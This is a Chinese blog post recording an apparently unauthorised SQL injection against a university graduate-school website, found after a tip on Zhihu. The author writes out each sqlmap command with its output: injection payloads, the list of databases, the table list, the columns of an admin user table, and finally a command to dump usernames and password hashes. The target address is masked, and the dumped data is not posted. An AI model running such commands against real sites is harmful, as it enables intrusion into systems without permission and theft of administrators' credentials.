---
title: 一次Sqlmap注入
date: 2016-12-28 17:18:29
categories: Hack
tags: 
- SQLMap
---
<Excerpt in index | 首页摘要> 
>利用sqlmap注入
>
>暴库
>
><!-- more -->
><The rest of contents | 余下全文> 



今天在知乎上，意外发现某个说发现某个学校研究生学院官网存在注入漏洞。

正巧前段时间服务器上装了sqlmap,就想要简单测试一下。结果就中奖了.

首先检测下是否存在注入漏洞

```
./sqlmap.py -u "http://xxx.xxx.xxx.xx/enrollment_employment_news.php?id=1159" --batch
```

返回信息如下:

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1159 AND 6486=6486

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1159 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 45 columns
    Payload: id=1159 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178627a71,0x4c5251535a70614c747668565a476f564267575449586b7379504f51564c5458526d526157694976,0x716a707a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YjbD
---
[01:13:20] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: Apache 2.4.18, PHP 5.2.17

```

windows的操作系统Apache的服务器mysql的数据库php5.x

基本可以确定这个连接确实存在注入点了.

尝试枚举一下数据库

```
./sqlmap.py -u "http://xxx.xxx.xxx.xx/enrollment_employment_news.php?id=1159" --dbs
```

爆出的数据库如下

```
available databases [10]:
[*] ecms
[*] information_schema
[*] mysql
[*] newcmxy
[*] performance_schema
[*] test
[*] xgb
[*] xlzx
[*] zj
[*] zs
```

查询下当前的数据库

```
./sqlmap.py -u "http://xxx.xxx.xxx.xx/enrollment_employment_news.php?id=1159" --current-db
```

```
current database:    'ecms'
```

枚举以下当前数据库里面的tables

```
./sqlmap.py -u "http://xxx.xxx.xxx.xx/enrollment_employment_news.php?id=1159" -D ecms --tables
```

```
+-------------------------------+
| user                          |
| count_click                   |
| master                        |
| phome_ecms_download           |
| phome_ecms_dsfc               |
| phome_ecms_flash              |
| phome_ecms_infoclass_download |
| phome_ecms_infoclass_dsfc     |
| phome_ecms_infoclass_flash    |
| phome_ecms_infoclass_news     |
| phome_ecms_infoclass_photo    |
| phome_ecms_infotmp_download   |
| phome_ecms_infotmp_dsfc       |
| phome_ecms_infotmp_flash      |
| phome_ecms_infotmp_news       |
| phome_ecms_infotmp_photo      |
| phome_ecms_news               |
| phome_ecms_photo              |
| phome_enewsad                 |
| phome_enewsadclass            |
| phome_enewsadminstyle         |
| phome_enewsbefrom             |
| phome_enewsbq                 |
| phome_enewsbqclass            |
| phome_enewsbqtemp             |
| phome_enewsbqtempclass        |
| phome_enewsbuybak             |
| phome_enewscard               |
| phome_enewschecktext          |
| phome_enewsclass              |
| phome_enewsdo                 |
| phome_enewsdolog              |
| phome_enewsdownerror          |
| phome_enewsdownrecord         |
| phome_enewsdownurlqz          |
| phome_enewsf                  |
| phome_enewsfava               |
| phome_enewsfavaclass          |
| phome_enewsfeedback           |
| phome_enewsfeedbackclass      |
| phome_enewsfile               |
| phome_enewsgbook              |
| phome_enewsgbookclass         |
| phome_enewsgfenip             |
| phome_enewsgroup              |
| phome_enewsinfoclass          |
| phome_enewsjstemp             |
| phome_enewsjstempclass        |
| phome_enewskey                |
| phome_enewslink               |
| phome_enewslinkclass          |
| phome_enewslinktmp            |
| phome_enewslisttemp           |
| phome_enewslisttempclass      |
| phome_enewslog                |
| phome_enewsmember             |
| phome_enewsmemberadd          |
| phome_enewsmembergroup        |
| phome_enewsmod                |
| phome_enewsnewstemp           |
| phome_enewsnewstempclass      |
| phome_enewsnotcj              |
| phome_enewspage               |
| phome_enewspageclass          |
| phome_enewspic                |
| phome_enewspicclass           |
| phome_enewspl                 |
| phome_enewsplwords            |
| phome_enewspostdata           |
| phome_enewspublic             |
| phome_enewssearch             |
| phome_enewssearchtemp         |
| phome_enewssearchtempclass    |
| phome_enewsshopdd             |
| phome_enewsshoppayfs          |
| phome_enewsshopps             |
| phome_enewstable              |
| phome_enewstempvar            |
| phome_enewstempvarclass       |
| phome_enewsuser               |
| phome_enewsuserjs             |
| phome_enewsuserlist           |
| phome_enewsvote               |
| phome_enewsvotetemp           |
| phome_enewswords              |
| phome_enewswriter             |
| phome_enewszt                 |
| phome_enewsztclass            |
| role                          |
| tutor                         |
| uploadfile                    |
+-------------------------------+
```

唔,phome_enewsuser比较 像是.

枚举下字段

```
./sqlmap.py -u "http://xxx.xxx.xxx.xx/enrollment_employment_news.php?id=1159" -D ecms -T phome_enewsuser --columns
```

```
[8 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| adminclass | mediumtext  |
| checked    | smallint(3) |
| groupid    | smallint(6) |
| password   | varchar(32) |
| rnd        | varchar(20) |
| styleid    | smallint(6) |
| userid     | int(11)     |
| username   | varchar(30) |
+------------+-------------+
```

最后就是枚举具体值了

```
./sqlmap.py -u "http://xxx.xxx.xxx.xx/enrollment_employment_news.php?id=1159" -D ecms -T phome_enewsuser -C "userid,username,password" --dump
```

数据就不贴了。乌云也没了。也没地方提交漏洞。就自己简单记一下吧。